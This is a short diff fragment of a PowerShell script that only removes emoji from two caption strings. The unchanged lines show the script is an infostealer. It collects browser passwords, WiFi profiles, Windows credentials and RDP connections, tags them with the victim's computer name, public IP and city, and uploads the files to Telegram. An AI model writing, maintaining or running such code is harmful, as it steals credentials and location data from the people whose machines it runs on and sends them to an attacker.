@@ -815,14 +815,14 @@ if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkC
     
     if ($allSummaryData.Count -gt 0) {
         $totalFiles += 1
-        $browserCaption = "🌐 Browser Passwords - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nEntries: $($allSummaryData.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        $browserCaption = " Browser Passwords - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nEntries: $($allSummaryData.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
         
         if (Send-TelegramFile -FilePath $BrowserJSONPath -Caption $browserCaption) { $filesSent++ }
     }
     
     if ($wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0 -or $rdpConnections.Count -gt 0) {
         $totalFiles += 1
-        $networkCaption = "📶 Network Credentials - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nWiFi Networks: $($wifiData.Profiles.Count)`nWindows Credentials: $($networkCredentials.Count)`nRDP Connections: $($rdpConnections.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        $networkCaption = " Network Credentials - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nWiFi Networks: $($wifiData.Profiles.Count)`nWindows Credentials: $($networkCredentials.Count)`nRDP Connections: $($rdpConnections.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
         
         if (Send-TelegramFile -FilePath $NetworkJSONPath -Caption $networkCaption) { $filesSent++ }
     }
